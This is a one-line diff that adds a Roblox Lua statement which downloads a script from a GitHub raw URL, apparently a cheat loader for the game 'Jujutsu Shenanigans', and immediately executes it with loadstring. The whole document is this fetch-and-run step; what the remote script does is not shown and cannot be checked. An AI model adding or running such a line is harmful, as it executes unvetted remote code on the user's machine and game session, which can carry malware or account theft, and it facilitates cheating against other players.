@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/topprefectmatch/loaders/main/loaders/hired-killer-jujutsu-shenanigans-spam4-xl7xsy4koeowvb.lua"))()
